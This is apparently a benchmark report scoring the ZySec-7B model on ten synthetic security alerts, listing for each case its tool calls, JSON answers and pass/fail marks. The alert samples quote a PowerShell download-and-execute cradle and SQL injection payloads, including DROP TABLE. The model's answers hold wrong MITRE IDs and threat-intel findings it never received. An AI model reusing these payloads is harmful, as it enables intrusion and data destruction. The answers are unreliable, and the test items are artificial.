# Playbook benchmark — `hf.co/koesn/ZySec-7B-v1-GGUF:Q4_K_M`

Model: `hf.co/koesn/ZySec-7B-v1-GGUF:Q4_K_M`  
Mode: **describe-only**  
Run started: 2026-05-06 02:37:44  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **71%** |
| Verdict accuracy | 10/10 (100%) |
| Severity accuracy | 9/10 (90%) |
| MITRE accuracy | 4/10 (40%) |
| Tool-selection accuracy | 5/10 (50%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 0 |
| p50 latency | 1.2 s |
| p95 latency | 1.7 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 3.7s |
| PB-2 | inci | PASS | PASS | PASS | FAIL | 1.4s |
| PB-3 | inci | PASS | PASS | FAIL | FAIL | 1.2s |
| PB-4 | inci | PASS | PASS | PASS | PASS | 1.0s |
| PB-5 | inci | PASS | PASS | FAIL | FAIL | 1.0s |
| PB-6 | inci | PASS | FAIL | FAIL | FAIL | 1.5s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 0.7s |
| PB-8 | inci | PASS | PASS | FAIL | PASS | 1.7s |
| PB-9 | inci | PASS | PASS | FAIL | PASS | 0.9s |
| PB-10 | inci | PASS | PASS | FAIL | FAIL | 1.1s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 3.73s · GPU 93%/18147MB · CPU 21% · RAM 32349MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "User alice (laptop 10.0.4.22) authenticated successfully at expected time and location; cmdb shows criticality 'low' for this asset."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 1.37s · GPU 93%/17735MB · CPU 33% · RAM 32327MB

_Tool calls_:
```
- threat_intel.lookup_ip('41.78.122.18')(null) -> (described-only)
- cmdb.get_asset(['DC01', 'FILER-02', 'FINANCE-DB', 'ENG-FILE', 'BACKUP-01'])(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1078.002",
    "T1021.001"
  ],
  "tools_used": [
    "threat_intel.lookup_ip('41.78.122.18')",
    "cmdb.get_asset(['DC01', 'FILER-02', 'FINANCE-DB', 'ENG-FILE', 'BACKUP-01'])"
  ],
  "rationale": "External IP 41.78.122.18 has a clean threat intel record, but simultaneous RDP logins from the same domain admin account to multiple critical assets is suspicious; MITRE T1078 (Valid Accounts) and T1021 (Remote Services)."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=FAIL

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 1.16s · GPU 93%/17735MB · CPU 31% · RAM 32312MB

_Tool calls_:
```
- threat_intel.lookup_ip('89.248.165.74')(null) -> (described-only)
- cmdb.get_asset('webhost')(null) -> (described-only)
- siem.query_logs('admin', 300)(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1100",
    "T1105"
  ],
  "tools_used": [
    "threat_intel.lookup_ip('89.248.165.74')",
    "cmdb.get_asset('webhost')",
    "siem.query_logs('admin', 300)"
  ],
  "rationale": "High volume of POST requests to /wp-login.php from multiple sources, including successful logins by admin accounts; IP 89.248.165.74 has a suspicious reputation (threat intel)."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 1.04s · GPU 92%/17735MB · CPU 29% · RAM 32294MB

_Tool calls_:
```
- edr.get_processes(null) -> (described-only)
- threat_intel.lookup_ip(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1059.001",
    "T1027.001"
  ],
  "tools_used": [
    "edr.get_processes",
    "threat_intel.lookup_ip"
  ],
  "rationale": "EDR process chain winword.exe -> powershell.exe matches a known suspicious pattern (office-app->shell); the remote URL resolves to a malicious IP (185.220.101.15) with a threat intel verdict of 'malicious'."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['edr.get_processes', 'threat_intel.lookup_ip'])

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 1.04s · GPU 92%/17735MB · CPU 15% · RAM 32313MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- openvas.scan_host(null) -> (described-only)
- threat_intel.lookup_ip(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1486.003"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "openvas.scan_host",
    "threat_intel.lookup_ip"
  ],
  "rationale": "Internal host 10.0.4.55 exhibits high-volume, long-duration DNS subdomain queries to cdn-update.xyz (suspicious domain); threat intel shows cdn-update.xyz as a known malicious C2 server with TXT records containing large payloads."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 1.45s · GPU 93%/17737MB · CPU 18% · RAM 32337MB

_Tool calls_:
```
- threat_intel.lookup_ip('185.220.101.45')(null) -> (described-only)
- cmdb.get_asset('webhost')(null) -> (described-only)
- siem.query_logs('admin OR root OR oracle OR postgres OR git OR test OR ubuntu', 6)(null) -> (described-only)
- siem.query_logs('ubuntu', 1)(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "medium",
  "mitre": [
    "T1100 (Brute Force)",
    "T1110 (Exfiltration)"
  ],
  "tools_used": [
    "threat_intel.lookup_ip('185.220.101.45')",
    "cmdb.get_asset('webhost')",
    "siem.query_logs('admin OR root OR oracle OR postgres OR git OR test OR ubuntu', 6)",
    "siem.query_logs('ubuntu', 1)"
  ],
  "rationale": "External IP 185.220.101.45 has a history of brute force attempts against webhost's user accounts; successful login as ubntu from the same source IP suggests possible exfiltration."
}
```

_Scoring_: verdict=PASS severity=FAIL mitre=FAIL tools=FAIL

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 0.72s · GPU 93%/17737MB · CPU 40% · RAM 32303MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "Internal host webhost (10.0.4.10) with criticality 'critical'. Alice (user) has a recent cmdb.get_asset call with no tags indicating privilege misuse or suspicious activity."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 1.74s · GPU 93%/17737MB · CPU 15% · RAM 32303MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- openvas.scan_host(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1068.003",
    "T1078.002"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "openvas.scan_host"
  ],
  "rationale": "External IP 185.62.190.13 has a history of SQLi activity (threat intel); the UNION SELECT request returned a large response body, indicating possible data theft (MITRE T1078)."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'openvas.scan_host'])

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 0.92s · GPU 92%/17737MB · CPU 37% · RAM 32272MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "medium",
  "mitre": [
    "T1223.001"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "User bob, who is a developer with sudo rights but no documented need to modify service-account permissions at this time, executed a sudo command modifying the sudo group at an unusual hour (03:17). SIEM shows no related activity in the last 24 hours."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 1.10s · GPU 92%/17737MB · CPU 10% · RAM 32282MB

_Tool calls_:
```
- cmdb.get_asset('DC01')(null) -> (described-only)
- threat_intel.lookup_ip('192.168.50.13')(null) -> (described-only)
- siem.query_logs('Administrator', 4)(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1105",
    "T1106"
  ],
  "tools_used": [
    "cmdb.get_asset('DC01')",
    "threat_intel.lookup_ip('192.168.50.13')",
    "siem.query_logs('Administrator', 4)"
  ],
  "rationale": "Sequential BadPassword events for Administrator from a workstation, followed by successful logon; IP 192.168.50.13 has no known issues."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=FAIL
